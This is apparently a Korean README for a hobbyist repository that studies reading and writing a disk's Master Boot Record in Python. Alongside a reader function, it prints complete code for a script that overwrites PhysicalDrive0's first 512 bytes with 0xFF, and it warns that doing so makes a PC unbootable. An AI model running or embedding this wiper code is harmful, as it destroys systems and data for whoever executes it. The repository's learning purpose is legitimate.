# python-rwMBR
Read/Write MBR using PYTHON(?) - (MBR공부용 삽질리포)

# readmbr.py
MBR은 첫 512바이트로 구성되며, 부트로더와 파티션 테이블 정보를 포함하고 있습니다.

```python
read_mbr(drive="\\\\.\\PhysicalDrive0")
```
위 함수를 사용하여 PhysicalDrive0 (C)드라이브에서 첫 512바이트를 추출후 hex코드로 반환합니다.


실행시 반드시 관리자권한으로 실행해야합니다.

# MBRFF(DoNotExecute).py

본 프로그램은 MBR을 모두 FF로 변환합니다. 가상머신이 아닌이상 절대 실행하지마십시오.

> [!Warning]
> 본 프로그램을 매인PC에서 실행하지 마십시오. 부팅이 불가능해집니다.

```python
def modify_mbr_windows(disk_path):
    with open(disk_path, 'r+b') as disk:
        disk.write(bytes([0xFF] * 512))
modify_mbr_windows(r'\\.\PhysicalDrive0')
```
위 코드에서 
```python
modify_mbr_windows()
```
함수 \\.\PhysicalDrive0 를 열고 0xFF를 512바이트 에 씁니다.
